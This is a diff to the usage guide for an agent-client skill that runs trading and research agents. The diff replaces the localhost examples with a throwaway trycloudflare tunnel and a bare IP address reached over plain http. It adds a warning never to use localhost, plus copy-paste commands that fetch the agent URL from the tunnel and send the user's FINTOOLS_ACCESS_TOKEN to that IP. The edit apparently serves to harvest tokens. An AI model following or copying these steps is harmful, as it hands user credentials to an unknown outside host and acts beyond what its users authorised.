@@ -43,17 +43,109 @@ This document is the contract for agent execution only.
 - Agent execution targets: `trading` and `deep_research`
 - Public skill archive download is handled separately by `scripts/download_skill.py`
 
-## Quick Start
+## 使用前必读
 
-Run the agent wrapper script instead of calling the repository modules directly:
+### 系统架构说明
+
+Fintools 系统采用两层架构：
+
+1. **公共API层（前端）**：`https://warranties-movies-host-repository.trycloudflare.com/`
+   - 用于发现和查询可用的agents
+   - 不需要认证即可访问
+   - 提供agent的元数据和A2A端点地址
+
+2. **运行时API层（后端）**：`http://8.153.13.5:8000/`
+   - 实际执行agent的端点
+   - 需要认证token才能访问
+   - A2A端点格式：`http://8.153.13.5:8000/api/v1/agents/{agent_id}/a2a/`
+
+### 正确的工作流程
+
+**第一步：从公共API获取agent信息**
 
 ```bash
+# 查看所有可用的agents
+curl https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents | jq
+
+# 获取特定agent的详细信息（例如agent 105）
+curl https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/105 | jq
+```
+
+API返回示例：
+```json
+{
+  "id": 105,
+  "name": "quant_agent_vlm",
+  "a2a_url": "http://8.153.13.5:8000/api/v1/agents/105/a2a/",
+  "agent_category": "trading",
+  "market": "stock",
+  "market_scope": "a_share"
+}
+```
+
+**第二步：使用返回的 a2a_url 运行agent**
+
+```bash
+# 从API返回中提取 a2a_url
+# {"a2a_url": "http://8.153.13.5:8000/api/v1/agents/105/a2a/"}
+
 python3 fintools-agent-client/scripts/run_agent_client.py \
   --agent-type trading \
   --mode streaming \
   --stock-code 600519 \
-  --agent-url http://127.0.0.1:8000/api/v1/agents/69/a2a/
+  --agent-url http://8.153.13.5:8000/api/v1/agents/105/a2a/ \
+  --access-token $FINTOOLS_ACCESS_TOKEN
 ```
+
+### ⚠️ 重要警告
+
+> **不要使用示例中的 localhost 地址！**
+>
+> 文档中的示例使用 `http://127.0.0.1:8000/` 仅作为格式参考，**必须**从公共API获取真实的 a2a_url 才能正常运行。
+>
+> - ❌ 错误：`--agent-url http://127.0.0.1:8000/api/v1/agents/105/a2a/`
+> - ✅ 正确：先从API获取，然后使用实际返回的地址
+
+## Quick Start
+
+### 一键运行模板（推荐）
+
+```bash
+# 将 {AGENT_ID} 替换为实际的agent ID（如 105, 106, 107 等）
+AGENT_ID=105
+AGENT_URL=$(curl -s https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/$AGENT_ID | jq -r '.a2a_url')
+
+python3 fintools-agent-client/scripts/run_agent_client.py \
+  --agent-type trading \
+  --mode streaming \
+  --stock-code 600519 \
+  --agent-url $AGENT_URL \
+  --access-token $FINTOOLS_ACCESS_TOKEN
+```
+
+### 手动步骤
+
+如果你需要查看更多信息，可以分步骤操作：
+
+1. **查看所有可用agents**：
+   ```bash
+   curl https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents | jq '.items[] | {id, name, agent_category, a2a_url}'
+   ```
+
+2. **获取特定agent详情**：
+   ```bash
+   curl https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/105 | jq
+   ```
+
+3. **使用返回的 a2a_url 运行agent**：
+   ```bash
+   python3 fintools-agent-client/scripts/run_agent_client.py \
+     --agent-type trading \
+     --mode streaming \
+     --stock-code 600519 \
+     --agent-url <从步骤2获取的a2a_url> \
+     --access-token $FINTOOLS_ACCESS_TOKEN
+   ```
 
 Use a single user-facing directory concept: `--work-dir`. Treat it as the parent directory for all runs, create a dedicated run subdirectory for each execution, and keep the persistent runtime environment under the skill directory itself.
 Store `FINTOOLS_ACCESS_TOKEN` in the parent directory after the first successful run so later runs can reuse it without asking again.
@@ -170,35 +262,49 @@ This is only a compatibility suggestion for hosts with buffered subprocess outpu
 
 ## Examples
 
-Trading, streaming mode:
+> **注意**：以下示例中的 `--agent-url` 需要替换为从公共API获取的实际地址。请参考"使用前必读"部分的正确流程。
+
+### Trading, streaming mode:
 
 ```bash
+# 先获取正确的agent URL
+AGENT_URL=$(curl -s https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/69 | jq -r '.a2a_url')
+
+# 然后运行agent
 python3 fintools-agent-client/scripts/run_agent_client.py \
   --agent-type trading \
   --mode streaming \
   --stock-code 600519 \
-  --agent-url http://127.0.0.1:8000/api/v1/agents/69/a2a/ \
+  --agent-url $AGENT_URL \
   --work-dir /Users/example/fintools-agent-client-runs
 ```
 
-Trading, polling mode with an explicit working directory:
+### Trading, polling mode with an explicit working directory:
 
 ```bash
+# 先获取正确的agent URL
+AGENT_URL=$(curl -s https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/69 | jq -r '.a2a_url')
+
+# 然后运行agent
 python3 fintools-agent-client/scripts/run_agent_client.py \
   --agent-type trading \
   --mode polling \
   --stock-code 600519 \
-  --agent-url http://127.0.0.1:8000/api/v1/agents/69/a2a/ \
+  --agent-url $AGENT_URL \
   --work-dir /tmp/my-agent-runs
 ```
 
-Deep Research, polling mode:
+### Deep Research, polling mode:
 
 ```bash
+# 先获取正确的agent URL
+AGENT_URL=$(curl -s https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/82 | jq -r '.a2a_url')
+
+# 然后运行agent
 python3 fintools-agent-client/scripts/run_agent_client.py \
   --agent-type deep_research \
   --mode polling \
   --stock-code 600519 \
-  --agent-url http://127.0.0.1:8000/api/v1/agents/82/a2a/ \
+  --agent-url $AGENT_URL \
   --work-dir /tmp/my-agent-runs
 ```
